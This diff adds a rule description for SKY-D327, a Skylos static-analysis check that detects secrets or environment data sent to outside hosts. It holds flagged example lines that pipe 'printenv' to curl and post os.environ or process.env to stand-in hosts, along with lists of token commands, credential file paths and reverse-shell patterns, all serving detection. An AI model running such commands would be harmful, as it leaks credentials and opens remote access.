@@ -1,0 +1,252 @@
+id: SKY-D327
+title: Secrets or environment sent to an outside host
+family: security
+severity: CRITICAL
+languages: [Shell, GitHub Actions, GitLab CI, Dockerfile, Python, TypeScript/JavaScript]
+gate:
+  full: critical_blocks
+cwe: [CWE-200]
+
+what_it_is: >-
+  Data exfiltration means copying secrets off the machine. SKY-D327 reports a
+  command or HTTP call that sends the whole environment, a token printed by a
+  CLI, a credential file or a secret-named variable to a host that is not
+  the local machine.
+
+why_it_matters: >-
+  CI runners and developer laptops hold cloud keys, registry tokens and
+  `.env` files. One `printenv | curl … @-` in a build script, or a
+  dependency's crash reporter that posts `os.environ`, hands all of them to
+  whoever runs the receiving server.
+
+flagged_example:
+  language: shell
+  filename: scripts/support-bundle.sh
+  expect_line: 6
+  code: |
+    #!/usr/bin/env bash
+    # Collect build details for a support ticket.
+    set -euo pipefail
+
+    echo "node $(node --version), npm $(npm --version)"
+    printenv | curl -s -X POST https://paste.example.dev/upload --data-binary @-
+
+not_flagged_example:
+  language: shell
+  filename: scripts/support-bundle.sh
+  code: |
+    #!/usr/bin/env bash
+    # Collect build details for a support ticket.
+    set -euo pipefail
+
+    {
+      echo "node $(node --version), npm $(npm --version)"
+      uname -srm
+    } > support-bundle.txt
+    curl -s -X POST https://paste.example.dev/upload --data-binary @support-bundle.txt
+  why: >-
+    The upload sends a file the script wrote itself, holding only tool
+    versions. Nothing that dumps the environment, prints a token or reads a
+    credential file feeds the upload, the file name is not a credential
+    file, and no secret-named variable appears in the `curl` command.
+
+more_examples:
+  - flagged:
+      language: python
+      filename: app/crash_report.py
+      expect_line: 7
+      code: |
+        import os
+
+        import requests
+
+
+        def send_crash_report(error: str) -> None:
+            requests.post(
+                "https://crash-reports.example.dev/api/report",
+                json={"error": error, "env": dict(os.environ)},
+                timeout=10,
+            )
+    not_flagged:
+      language: python
+      filename: app/crash_report.py
+      code: |
+        import os
+
+        import requests
+
+
+        def send_crash_report(error: str) -> None:
+            requests.post(
+                "https://crash-reports.example.dev/api/report",
+                headers={"Authorization": f"Bearer {os.environ['CRASH_API_KEY']}"},
+                json={"error": error},
+                timeout=10,
+            )
+      why: >-
+        The API key travels in a header to the service it belongs to. Skylos
+        only looks for `os.environ` in the `data=` and `json=` payload and
+        for credential files opened in `files=`.
+  - flagged:
+      language: typescript
+      filename: src/crashReport.ts
+      expect_line: 2
+      code: |
+        export async function sendCrashReport(error: Error): Promise<void> {
+          await fetch("https://crash-reports.example.dev/api/report", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ message: error.message, env: process.env }),
+          });
+        }
+    not_flagged:
+      language: typescript
+      filename: src/crashReport.ts
+      code: |
+        export async function sendCrashReport(error: Error): Promise<void> {
+          await fetch("https://crash-reports.example.dev/api/report", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              Authorization: `Bearer ${process.env.CRASH_API_KEY}`,
+            },
+            body: JSON.stringify({ message: error.message }),
+          });
+        }
+      why: >-
+        `process.env` appears only in the headers. Skylos reads the request
+        body (`body` for `fetch`, `data` for axios) and treats headers as the
+        normal way an API key reaches its own API.
+
+how_skylos_decides:
+  - >-
+    Reads shell commands in `.sh`, `.bash`, `.zsh`, `.ksh` and `.bats` files
+    (one statement at a time), GitHub Actions `run:` steps (workflows and
+    composite actions), GitLab CI `script`, `before_script`, `after_script`
+    and `pre_get_sources_script` items, Dockerfile `RUN` instructions, fixed
+    command strings in Python `os.system()`, `os.popen()`,
+    `subprocess.getoutput()` or a `subprocess` call with `shell=True`, and
+    fixed strings passed to `child_process.exec()` in TypeScript and
+    JavaScript.
+  - >-
+    Splits each command at `;`, `&&`, `||` and `|`. In a pipeline, a
+    sensitive source followed by an upload to an outside host is reported.
+    Sources are environment dumps (`printenv`, `env`, `set`, `declare`,
+    `typeset`, bare `export`), token commands (`gh auth token`,
+    `gcloud auth print-access-token`, `op item get`, `npm token`,
+    `aws configure get` of a secret or token) and readers such as `cat`,
+    `grep`, `base64` or `tar` of a credential file. Uploads are `nc`,
+    `socat`, `ssh`, `scp`, `sftp`, `ftp` or `rsync`, `curl` with a data,
+    form or upload flag that reads standard input (`-d @-`, `-F f=@-`,
+    `-T -`) and `wget --post-file=-`.
+  - >-
+    Also reports, without a pipe: `curl` or `wget` uploading a credential
+    file (`-d @.env`, `-F file=@.env.local`); `scp`, `sftp` or `rsync`
+    copying one to a remote host; any network command whose arguments hold a
+    variable whose name contains `TOKEN`, `SECRET`, `PASSWORD`, `PASS`,
+    `API_KEY`, `PRIVATE_KEY`, `ACCESS_KEY`, `CREDENTIAL` or `OAUTH`; and
+    reverse shells (`/dev/tcp/host/port`, `nc -e sh`, `socat … exec:sh`).
+  - >-
+    A credential file is `.env` and `.env.*`, `*.env`, `.envrc`,
+    `.netrc`, `.npmrc`, `.pypirc`, `.git-credentials`, `credentials`,
+    `auth.json`, `config.json`, `id_rsa`, `id_ed25519`, `known_hosts`, a
+    `.key`, `.pem`, `.p12` or `.pfx` file, or anything under `.ssh/`,
+    `.aws/`, `.azure/`, `.kube/`, `.claude/`, `.codex/`, `.config/gh/`,
+    `.docker/config.json` or `/run/secrets/`.
+  - >-
+    Skips destinations that are not outside: `http://localhost`,
+    `127.0.0.1` and `0.0.0.0` URLs. A host counts as outside when the
+    command has any other `http(s)://` URL or a `host:path` /
+    `user@host:path` argument.
+  - >-
+    In Python, also reports `requests` or `httpx` `post()`, `put()`,
+    `patch()` (or `request()` with one of those methods) whose `data=` or
+    `json=` contains `os.environ`, or whose `files=` opens a credential file,
+    unless the URL is a fixed local address. This check, and the
+    fixed-command check above, only run in files whose text contains
+    `.env`, `curl`, `os.environ`, `printenv`, `requests`, `subprocess` or
+    `httpx`.
+  - >-
+    In TypeScript and JavaScript, also reports a `fetch` with a literal
+    `POST`, `PUT` or `PATCH` method, `axios.post/put/patch`,
+    `axios.request` or `axios({method, url, data})` whose body reads
+    `process.env`, unless the URL is local or only `NEXT_PUBLIC_` names are
+    read. Every finding is CRITICAL.
+
+source_refs:
+  - path: skylos/security/command_guard.py
+    symbol: "def scan_shell_command("
+    note: entry point shared by every shell, CI and Dockerfile caller.
+  - path: skylos/security/command_guard_exfil.py
+    symbol: "def _pipeline_has_data_exfil("
+  - path: skylos/security/command_guard_exfil.py
+    symbol: "def _network_sink_sends_secret_env("
+  - path: skylos/security/command_guard_exfil.py
+    symbol: "REVERSE_SHELL_PATTERNS = ("
+  - path: skylos/security/command_guard_paths.py
+    symbol: "def is_sensitive_path("
+    note: what counts as a credential file.
+  - path: skylos/security/command_guard_paths.py
+    symbol: "def has_external_destination("
+  - path: skylos/rules/danger/danger.py
+    symbol: "def _append_http_exfil_findings("
+    note: Python HTTP payloads; the token gate is at the end of scan_file_with_tree.
+  - path: skylos/visitors/languages/typescript/danger.py
+    symbol: "def _check_typescript_env_exfil("
+  - path: skylos/rules/config/cicd/github_actions.py
+    symbol: "def _scan_run_blocks("
+  - path: test/test_shell_security.py
+    symbol: "def test_printenv_piped_to_localhost_curl_not_external_exfil"
+
+fix:
+  explanation: >-
+    Upload only what the receiver needs: write the chosen values to a file
+    and send that file, or name the variables one by one. If a secret really
+    must reach another service, send it in a header to the service it
+    belongs to, not as the payload of a debug or paste endpoint.
+  filename: scripts/support-bundle.sh
+  code: |
+    #!/usr/bin/env bash
+    # Collect build details for a support ticket.
+    set -euo pipefail
+
+    echo "node $(node --version), npm $(npm --version)" > support-bundle.txt
+    curl -s -X POST https://paste.example.dev/upload --data-binary @support-bundle.txt
+
+false_alarms_and_suppression:
+  misfires:
+    - >-
+      In shell, CI and Dockerfile commands, a secret-named variable is
+      reported wherever it appears in a network command, including the
+      normal `curl -H "Authorization: Bearer $OPENAI_API_KEY"
+      https://api.openai.com/…`. The Python and TypeScript checks ignore
+      headers; the shell check does not.
+    - >-
+      Template and example files count as credential files by name:
+      uploading `.env.example` or a `config.json` is reported. Copying a real
+      `.env` to your own server with `scp` is reported too.
+    - >-
+      In Python, one harmless value such as
+      `json={"release": os.environ.get("RELEASE")}` is enough to report the
+      call: any `os.environ` read inside the payload counts.
+    - >-
+      Missed: `ssh user@host` without a `:path` is not recognised as an
+      outside host, and in a GitHub Actions `run: |` block, or a multi-line
+      GitLab item, the block is split only at `;`, `&&`, `||` and `|`, not at
+      line breaks, so a pipeline that starts on a later line is read as
+      arguments of the first command and is not reported.
+  suppress:
+    - check: inline
+      text: >-
+        In a shell script, put the marker on the reported line, as a real
+        comment. In GitHub Actions, GitLab CI and Dockerfiles the marker may
+        also sit on the line directly above, with exactly one rule per marker.
+      language: shell
+      code: |
+        scp .env deploy@app1:/srv/app/.env  # skylos: ignore[SKY-D327] our own server
+    - check: config
+      text: >-
+        `[tool.skylos] ignore = ["SKY-D327"]` turns the rule off for the whole
+        project, which also hides a real exfiltration added later.
+
+related: [SKY-D338, SKY-D328, SKY-S101, SKY-D339]
